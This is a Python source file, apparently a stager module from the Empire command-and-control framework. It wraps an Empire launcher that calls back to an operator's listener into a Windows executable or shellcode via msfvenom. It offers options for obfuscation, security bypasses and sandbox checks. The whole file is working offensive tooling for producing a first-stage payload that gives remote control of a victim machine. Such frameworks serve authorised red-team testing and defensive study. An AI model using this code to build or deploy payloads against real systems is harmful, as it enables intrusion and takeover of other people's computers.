import logging
import subprocess

from empire.server.common import helpers

log = logging.getLogger(__name__)


class Stager:
    def __init__(self, mainMenu):
        self.info = {
            "Name": "Stage 0 - Cmd Exec",
            "Authors": [
                {
                    "Name": "Anthony Rose",
                    "Handle": "@Cx01N",
                    "Link": "https://twitter.com/Cx01N_",
                }
            ],
            "Description": "Generates windows command executable using msfvenom to act as a stage 0.",
            "Comments": [],
        }

        self.options = {
            "Listener": {
                "Description": "Listener to generate stager for.",
                "Required": True,
                "Value": "",
            },
            "Language": {
                "Description": "Language of the stager to generate.",
                "Required": True,
                "Value": "powershell",
                "SuggestedValues": ["powershell", "ironpython", "csharp"],
                "Strict": True,
            },
            "StagerRetries": {
                "Description": "Times for the stager to retry connecting.",
                "Required": False,
                "Value": "0",
            },
            "OutFile": {
                "Description": "Filename that should be used for the generated output.",
                "Required": False,
                "Value": "launcher.exe",
            },
            "Obfuscate": {
                "Description": "Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types. For powershell only.",
                "Required": False,
                "Value": "False",
                "SuggestedValues": ["True", "False"],
                "Strict": True,
            },
            "ObfuscateCommand": {
                "Description": "The Invoke-Obfuscation command to use. Only used if Obfuscate switch is True. For powershell only.",
                "Required": False,
                "Value": r"Token\All\1",
            },
            "SafeChecks": {
                "Description": "Checks for LittleSnitch or a SandBox, exit the staging process if true. Defaults to True.",
                "Required": True,
                "Value": "True",
                "SuggestedValues": ["True", "False"],
                "Strict": True,
            },
            "UserAgent": {
                "Description": "User-agent string to use for the staging request (default, none, or other).",
                "Required": False,
                "Value": "default",
            },
            "Proxy": {
                "Description": "Proxy to use for request (default, none, or other).",
                "Required": False,
                "Value": "default",
            },
            "ProxyCreds": {
                "Description": r"Proxy credentials ([domain\]username:password) to use for request (default, none, or other).",
                "Required": False,
                "Value": "default",
            },
            "Bypasses": {
                "Description": "Bypasses as a space separated list to be prepended to the launcher",
                "Required": False,
                "Value": "",
            },
            "Arch": {
                "Description": "Architecture of the .dll to generate (x64 or x86).",
                "Required": True,
                "Value": "x64",
                "SuggestedValues": ["x64", "x86"],
                "Strict": True,
            },
            "MSF_Format": {
                "Description": "Format for compiling the msfvenom payload.",
                "Required": True,
                "Value": "exe",
                "SuggestedValues": ["exe", "hex", "dword", "java", "python", "ps1"],
            },
        }

        self.main_menu = mainMenu

    def generate(self):
        language = self.options["Language"]["Value"]
        listener_name = self.options["Listener"]["Value"]
        obfuscate = self.options["Obfuscate"]["Value"]
        obfuscate_command = self.options["ObfuscateCommand"]["Value"]
        user_agent = self.options["UserAgent"]["Value"]
        proxy = self.options["Proxy"]["Value"]
        proxy_creds = self.options["ProxyCreds"]["Value"]
        stager_retries = self.options["StagerRetries"]["Value"]
        safe_checks = self.options["SafeChecks"]["Value"]
        arch = self.options["Arch"]["Value"]
        msf_format = self.options["MSF_Format"]["Value"]

        encode = True

        invoke_obfuscation = False
        if obfuscate.lower() == "true":
            invoke_obfuscation = True

        if language in ["csharp", "ironpython"]:
            if (
                self.main_menu.listenersv2.get_active_listener_by_name(
                    listener_name
                ).info["Name"]
                != "HTTP[S]"
            ):
                log.error(
                    "Only HTTP[S] listeners are supported for C# and IronPython stagers."
                )
                return ""

            self.launcher = self.main_menu.stagergenv2.generate_exe_oneliner(
                language=language,
                obfuscate=invoke_obfuscation,
                obfuscation_command=obfuscate_command,
                encode=encode,
                listener_name=listener_name,
            )

        elif language == "powershell":
            self.launcher = self.main_menu.stagergenv2.generate_launcher(
                listener_name,
                language=language,
                encode=encode,
                obfuscate=invoke_obfuscation,
                obfuscation_command=obfuscate_command,
                user_agent=user_agent,
                proxy=proxy,
                proxy_creds=proxy_creds,
                stager_retries=stager_retries,
                safe_checks=safe_checks,
                bypasses=self.options["Bypasses"]["Value"],
            )

        if self.launcher == "":
            print(helpers.color("[!] Error in launcher command generation."))
            return ""

        return self.generate_shellcode(msf_format, arch, self.launcher)

    def generate_shellcode(self, msf_format, arch, launcher):
        print(f"[*] Generating Shellcode {arch}")

        if arch == "x64":
            msf_payload = "windows/x64/exec"
        elif arch == "x86":
            msf_payload = "windows/exec"

        msf_command = f'msfvenom -p {msf_payload} -f {msf_format} CMD="{launcher}"'

        print(f"[*] MSF command -> {msf_command}")
        return subprocess.check_output(msf_command, shell=True)
